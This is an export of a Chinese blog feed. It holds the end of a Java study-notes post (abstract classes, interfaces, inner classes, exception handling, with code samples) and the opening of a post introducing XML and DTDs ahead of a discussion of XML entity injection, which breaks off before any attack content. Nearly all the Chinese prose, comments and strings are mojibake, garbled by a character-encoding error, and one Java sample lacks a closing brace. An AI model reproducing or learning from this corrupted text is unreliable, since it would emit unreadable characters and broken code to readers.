&#123;</span><br><span class="line">    //2.èµ‹åˆå€¼</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;åŒ¿åä»£ç å—&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //1åªæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot;é™æ€ä»£ç å—&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">//3.</span><br><span class="line">    public demo01() &#123;</span><br><span class="line">        System.out.println(&quot;æ„é€ æ–¹æ³•&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] arga)&#123;</span><br><span class="line">        demo01 a1 = new demo01();</span><br><span class="line">        System.out.println(&quot;------&quot;);</span><br><span class="line">        demo01 a2 = new demo01();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829200221714.png"></p><p>é™æ€å¯¼å…¥åŒ…  :  import static java.lang.Math.random;</p><h4 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h4><p>abstractä¿®é¥°ç¬¦å¯ä»¥ç”¨æ¥ä¿®é¥°æ–¹æ³•ä¹Ÿå¯ä»¥ä¿®é¥°ç±»,å¦‚æœä¿®é¥°æ–¹æ³•,é‚£ä¹ˆè¯¥æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•;å¦‚æœä¿®é¥°ç±»,é‚£ä¹ˆè¯¥ç±»å°±æ˜¯æŠ½è±¡ç±»ã€‚<br>æŠ½è±¡ç±»ä¸­å¯ä»¥æ²¡æœ‰æŠ½è±¡æ–¹æ³•,ä½†æ˜¯æœ‰æŠ½è±¡æ–¹æ³•çš„ç±»ä¸€å®šè¦å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚<br>æŠ½è±¡ç±»,ä¸èƒ½ä½¿ç”¨newå…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡,å®ƒæ˜¯ç”¨æ¥è®©å­ç±»ç»§æ‰¿çš„ã€‚æŠ½è±¡æ–¹æ³•,åªæœ‰æ–¹æ³•çš„å£°æ˜,æ²¡æœ‰æ–¹æ³•çš„å®ç°,å®ƒæ˜¯ç”¨æ¥è®©å­ç±»å®ç°çš„ã€‚<br>å­ç±»ç»§æ‰¿æŠ½è±¡ç±»,é‚£ä¹ˆå°±å¿…é¡»è¦å®ç°æŠ½è±¡ç±»æ²¡æœ‰å®ç°çš„æŠ½è±¡æ–¹æ³•,å¦åˆ™è¯¥å­ç±»ä¹Ÿè¦å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</p><p>æŠ½è±¡ç±»ï¼š</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202236686.png"></p><p>æŠ½è±¡ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œç»§æ‰¿äº†ä»–çš„å­ç±»ï¼Œéƒ½å¿…é¡»å®ç°è¦å®ç°ä»–çš„æ–¹æ³•</p><p>æŠ½è±¡æ–¹æ³•ï¼šåªæœ‰æ–¹æ³•çš„åå­—ï¼Œæ²¡æœ‰æ–¹æ³•çš„å®ç°</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202310818.png"></p><p>ä¸èƒ½newæŠ½è±¡ç±»ï¼Œåªèƒ½é å­ç±»å»å®ç°ä»–</p><p>æŠ½è±¡ç±»å¯ä»¥å¸è½½æ™®é€šæ–¹æ³•é‡Œ</p><p>æŠ½è±¡æ–¹æ³•å¿…é¡»åœ¨æŠ½è±¡ç±»ä¸­</p><p>æŠ½è±¡çš„æŠ½è±¡ï¼šçº¦æŸ</p><h4 id="æ¥å£çš„å®šä¹‰ä¸å®ç°"><a href="#æ¥å£çš„å®šä¹‰ä¸å®ç°" class="headerlink" title="æ¥å£çš„å®šä¹‰ä¸å®ç°"></a>æ¥å£çš„å®šä¹‰ä¸å®ç°</h4><p>æ™®é€šç±»:åªæœ‰å…·ä½“å®ç°<br>æŠ½è±¡ç±»:å…·ä½“å®ç°å’Œè§„èŒƒ(æŠ½è±¡æ–¹æ³•)éƒ½æœ‰!</p><p>æ¥å£:åªæœ‰è§„èŒƒ!è‡ªå·±æ— æ³•å†™æ–¹æ³•  ä¸“ä¸šçš„çº¦æŸ çº¦æŸå’Œå®ç°çš„åˆ†ç¦»ï¼šé¢æ¥å£ç¼–ç¨‹<br>æ¥å£å°±æ˜¯è§„èŒƒï¼Œå®šä¹‰çš„æ˜¯ä¸€ç»„è§„åˆ™ï¼Œä½“ç°äº†ç°å®ä¸–ç•Œä¸­â€œå¦‚æœä½ æ˜¯â€¦åˆ™å¿…é¡»èƒ½â€¦â€çš„æ€æƒ³ã€‚å¦‚æœä½ æ˜¯å¤©ä½¿ï¼Œåˆ™å¿…é¡»èƒ½é£ã€‚å¦‚æœä½ æ˜¯æ±½è½¦ï¼Œåˆ™å¿…é¡»èƒ½è·‘ã€‚å¦‚æœä½ å¥½äººï¼Œåˆ™å¿…é¡»å¹²æ‰åäºº;å¦‚æœä½ æ˜¯åäººï¼Œåˆ™å¿…é¡»æ¬ºè´Ÿå¥½äººã€‚</p><p><strong>æ¥å£çš„æœ¬è´¨æ˜¯å¥‘çº¦</strong>ï¼Œå°±åƒæˆ‘ä»¬äººé—´çš„æ³•å¾‹ä¸€æ ·ã€‚åˆ¶å®šå¥½åå¤§å®¶éƒ½éµå®ˆã€‚<br>OOçš„ç²¾é«“ï¼Œæ˜¯å¯¹å¯¹è±¡çš„æŠ½è±¡ï¼Œæœ€èƒ½ä½“ç°è¿™ä¸€ç‚¹çš„å°±æ˜¯æ¥å£ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è®¨è®ºè®¾è®¡æ¨¡å¼éƒ½åªé’ˆå¯¹å…·å¤‡äº†æŠ½è±¡èƒ½åŠ›çš„è¯­è¨€ï¼ˆæ¯”å¦‚c++ã€javaã€c#ç­‰)ï¼Œå°±æ˜¯å› ä¸ºè®¾è®¡æ¨¡å¼æ‰€ç ”ç©¶çš„ï¼Œå®é™…ä¸Šå°±æ˜¯å¦‚ä½•åˆç†çš„å»æŠ½è±¡ã€‚<br>å£°æ˜ç±»çš„å…³é”®å­—æ˜¯class,å£°æ˜æ¥å£çš„å…³é”®å­—æ˜¯interface</p><p>ä½œç”¨:</p><p>1ï¼çº¦æŸ<br>2ï¼å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œè®©ä¸åŒçš„äººå®ç°~10â€”&gt;1</p><ol start="3"><li><p>public abstract</p></li><li><p>public static final<br>5ã€‚æ¥å£ä¸èƒ½è¢«å®ä¾‹åŒ–å¿ƒï¼Œæ¥å£ä¸­æ²¡æœ‰æ„é€ æ–¹æ³•<del>6. implementså¯ä»¥å®ç°å¤šä¸ªæ¥å£<br>7.å¿…é¡»è¦é‡å†™æ¥å£ä¸­çš„æ–¹æ³•</del></p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">interface</span> <span class="title class_">Userservice</span>  &#123;</span><br><span class="line">    <span class="comment">//æ¥å£ä¸­æ‰€æœ‰çš„å®šä¹‰å…¶å®éƒ½æ˜¯æŠ½è±¡çš„ public abstract</span></span><br><span class="line">     <span class="type">int</span> age=<span class="number">999</span>;</span><br><span class="line">     <span class="comment">//å¸¸é‡  public static final</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠ½è±¡ç±»  extends</span></span><br><span class="line"><span class="comment">//ç±» å¯ä»¥å®ç°æ¥å£ implements æ¥å£</span></span><br><span class="line"><span class="comment">//å®ç°äº†æ¥å£çš„ç±»  å°±éœ€è¦é‡å†™æ¥å£ä¸­çš„æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ©ç”¨æ¥å£å®ç°å¤šç»§æ‰¿</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserserviceImpl</span> <span class="keyword">implements</span> <span class="title class_">Userservice</span>,Timeservice&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Timeservice</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å†…éƒ¨ç±»"><a href="#å†…éƒ¨ç±»" class="headerlink" title="å†…éƒ¨ç±»"></a>å†…éƒ¨ç±»</h4><p>å†…éƒ¨ç±»å°±æ˜¯åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨åœ¨å®šä¹‰ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚ï¼ŒAç±»ä¸­å®šä¹‰ä¸€ä¸ªBç±»ï¼Œé‚£ä¹ˆBç±»ç›¸å¯¹Aç±»æ¥è¯´å°±ç§°ä¸ºå†…éƒ¨ç±»ï¼Œè€ŒAç±»ç›¸å¯¹Bç±»æ¥è¯´å°±æ˜¯å¤–éƒ¨ç±»äº†ã€‚<br>1.æˆå‘˜å†…éƒ¨ç±»<br>â’‰é™æ€å†…éƒ¨ç±»3.å±€éƒ¨å†…éƒ¨ç±»4.åŒ¿åå†…éƒ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo010;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è¿™æ˜¯å¤–éƒ¨ç±»çš„æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">in</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¿™æ˜¯å†…éƒ¨ç±»çš„æ–¹æ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo010.Outer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        <span class="comment">//é€šè¿‡å¤–éƒ¨ç±»æ¥å®ç°å†…éƒ¨ç±»</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        inner.in();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªjavaç±»ä¸­å¯ä»¥æœ‰å¤šä¸ªclassç±»ï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ªpublic classç±»</p><p>å±€éƒ¨å†…éƒ¨ç±»</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831131531538.png"></p><h3 id="å¼‚å¸¸æœºåˆ¶"><a href="#å¼‚å¸¸æœºåˆ¶" class="headerlink" title="å¼‚å¸¸æœºåˆ¶"></a>å¼‚å¸¸æœºåˆ¶</h3><p>Error<br>Errorç±»å¯¹è±¡ç”±Javaè™šæ‹Ÿæœºç”Ÿæˆå¹¶æŠ›å‡ºâˆšå¤§å¤šæ•°é”™è¯¯ä¸ä»£ç ç¼–å†™è€…æ‰€æ‰§è¡Œçš„æ“ä½œæ— å…³ã€‚<br>Javaè™šæ‹Ÿæœºè¿è¡Œé”™è¯¯(Virtual MachineError)ï¼Œå½“JVMä¸å†æœ‰ç»§ç»­æ‰§è¡Œæ“ä½œæ‰€éœ€çš„å†…å­˜èµ„æºæ—¶ï¼Œå°†å‡ºç°OutOfMemoryErrorã€‚è¿™äº›å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒJavaè™šæ‹Ÿæœº(JVM)ä¸€èˆ¬ä¼šé€‰æ‹©çº¿ç¨‹ç»ˆæ­¢;<br>è¿˜æœ‰å‘ç”Ÿåœ¨è™šæ‹Ÿæœºè¯•å›¾æ‰§è¡Œåº”ç”¨æ—¶ï¼Œå¦‚ç±»å®šä¹‰é”™è¯¯(NoClassDefFoundError)ã€é“¾æ¥é”™è¯¯(LinkageError)ã€‚è¿™äº›é”™è¯¯æ˜¯ä¸å¯æŸ¥çš„ï¼Œå› ä¸ºå®ƒä»¬åœ¨åº”ç”¨ç¨‹åºçš„æ§åˆ¶å’Œå¤„ç†èƒ½åŠ›ä¹‹å¤–ï¼Œè€Œä¸”ç»å¤§å¤šæ•°æ˜¯ç¨‹åºè¿è¡Œæ—¶ä¸å…è®¸å‡ºç°çš„çŠ¶å†µã€‚</p><p>Exceptionä¸€<br>åœ¨Exceptionåˆ†æ”¯ä¸­æœ‰ä¸€ä¸ªé‡è¦çš„å­ç±»RuntimeException(è¿è¡Œæ—¶å¼‚å¸¸)<br>ArraylndexOutOfBoundsException(æ•°ç»„ä¸‹æ ‡è¶Šç•Œ)â€”NullPointerException(ç©ºæŒ‡é’ˆå¼‚å¸¸)<br>ArithmeticException(ç®—æœ¯å¼‚å¸¸)<br>MissingResourceException(ä¸¢å¤±èµ„æº)<br>ClassNotFoundException(æ‰¾ä¸åˆ°ç±»)ç­‰å¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸æ˜¯ä¸æ£€æŸ¥å¼‚å¸¸ï¼Œç¨‹åºä¸­å¯ä»¥é€‰æ‹©æ•è·å¤„ç†ï¼Œä¹Ÿå¯ä»¥ä¸å¤„ç†ã€‚<br>è¿™äº›å¼‚å¸¸ä¸€èˆ¬æ˜¯ç”±ç¨‹åºé€»è¾‘é”™è¯¯å¼•èµ·çš„ï¼Œç¨‹åºåº”è¯¥ä»é€»è¾‘è§’åº¦å°½å¯èƒ½é¿å…è¿™ç±»å¼‚å¸¸çš„å‘ç”Ÿ;<br>Errorå’ŒExceptionçš„åŒºåˆ«: Erroré€šå¸¸æ˜¯ç¾éš¾æ€§çš„è‡´å‘½çš„é”™è¯¯ï¼Œæ˜¯ç¨‹åºæ— æ³•æ§åˆ¶å’Œå¤„ç†çš„ï¼Œå½“å‡ºç°è¿™äº›å¼‚å¸¸æ—¶ï¼ŒJavaè™šæ‹Ÿæœº(JVM)ä¸€èˆ¬ä¼šé€‰æ‹©ç»ˆæ­¢çº¿ç¨‹;Exceptioné€šå¸¸æƒ…å†µä¸‹æ˜¯å¯ä»¥è¢«ç¨‹åºå¤„ç†æ—¶ï¼Œå¼€ä¸”ä»•ç¨‹åºç”²åº”è¯¥å°½å¯èƒ½çš„äº‘å¤„ç†è¿™äº›å¼‚åŠã€‚</p><p>å¼‚å¸¸å¤„ç†çš„ä¸¤ä¸ªæœºåˆ¶ï¼š</p><p>æŠ›å‡ºå¼‚å¸¸  æ•è·å¼‚å¸¸</p><p>å¼‚å¸¸å¤„ç†çš„äº”ä¸ªå…³é”®å­—</p><p>ï¼štry,catch,finally,throw,throws</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(a/b);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ç¨‹åºå‡ºç°å¼‚å¸¸ï¼Œå˜é‡bä¸èƒ½ä¸º0&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tryç›‘æ§åŒºåŸŸ  catch æ•è·ç¯å¢ƒ  finally  å¤„ç†å–„åå·¥ä½œ</p><p>try  catchå¿…é¡»æœ‰ï¼Œfinallyå¯ä»¥æˆ‘æ²¡æœ‰</p><p>Ctrl+Alt+Tè‡ªåŠ¨åŒ…è£¹</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831152224452.png"></p><p>é”™è¯¯å¼‚å¸¸åˆ†ç±»</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154143492.png"></p><p>ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154326072.png"></p><p>ä¸€èˆ¬åœ¨æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­å¤„ç†ä¸äº†ï¼Œå¯ä»¥ä¸»åŠ¨æŠ›å‡º</p><p>####è‡ªå®šä¹‰å¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//å¯èƒ½å­˜åœ¨å¼‚å¸¸çš„çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">throws</span> myException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¼ é€’çš„å‚æ•°ä¸º&quot;</span>+a);</span><br><span class="line">        <span class="keyword">if</span>(a&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">myException</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test(<span class="number">111</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (myException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Myexception=ã€‹&quot;</span>+e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xmlå®ä½“æ³¨å…¥æ¼æ´</title>
      <link href="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>#Xmlå®ä½“æ³¨å…¥æ¼æ´</p><p>##xmlä»‹ç»</p><p>###ä»€ä¹ˆæ˜¯ XML?</p><ul><li>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆ<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguageï¼‰</li><li>XML æ˜¯ä¸€ç§<em>æ ‡è®°è¯­è¨€</em>ï¼Œå¾ˆç±»ä¼¼ HTML</li><li>XML çš„è®¾è®¡å®—æ—¨æ˜¯<em>ä¼ è¾“æ•°æ®</em>ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®</li><li>XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦<em>è‡ªè¡Œå®šä¹‰æ ‡ç­¾</em>ã€‚</li><li>XML è¢«è®¾è®¡ä¸ºå…·æœ‰<em>è‡ªæˆ‘æè¿°æ€§</em>ã€‚</li><li>XML æ˜¯ <em>W3C çš„æ¨èæ ‡å‡†</em></li></ul><p>###XML ä¸ HTML çš„ä¸»è¦å·®å¼‚</p><p>XML ä¸æ˜¯ HTML çš„æ›¿ä»£ã€‚</p><p>XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡ï¼š</p><p>XML è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</p><p>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</p><p>HTML æ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p><h3 id="æ²¡æœ‰ä»»ä½•è¡Œä¸ºçš„-XML"><a href="#æ²¡æœ‰ä»»ä½•è¡Œä¸ºçš„-XML" class="headerlink" title="æ²¡æœ‰ä»»ä½•è¡Œä¸ºçš„ XML"></a>æ²¡æœ‰ä»»ä½•è¡Œä¸ºçš„ XML</h3><p><strong>XML æ˜¯ä¸ä½œä¸ºçš„ã€‚</strong></p><p>ä¹Ÿè®¸è¿™æœ‰ç‚¹éš¾ä»¥ç†è§£ï¼Œä½†æ˜¯ XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚</p><p><strong>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</strong></p><p><strong>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ã€‚</strong></p><p>###åŸºæœ¬è¯­æ³•</p><blockquote><p>æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾<br> XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ<br> XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ <br> XML çš„å±æ€§å€¼é¡»åŠ å¼•å·</p></blockquote><h3 id="å®ä½“å¼•ç”¨"><a href="#å®ä½“å¼•ç”¨" class="headerlink" title="å®ä½“å¼•ç”¨"></a>å®ä½“å¼•ç”¨</h3><p><img src="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image/20200904173922834-1700990484762-303.png"></p><p>##DTDä»‹ç»</p><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTDä»‹ç»</a></p><p><strong>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</strong></p><p><strong>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML 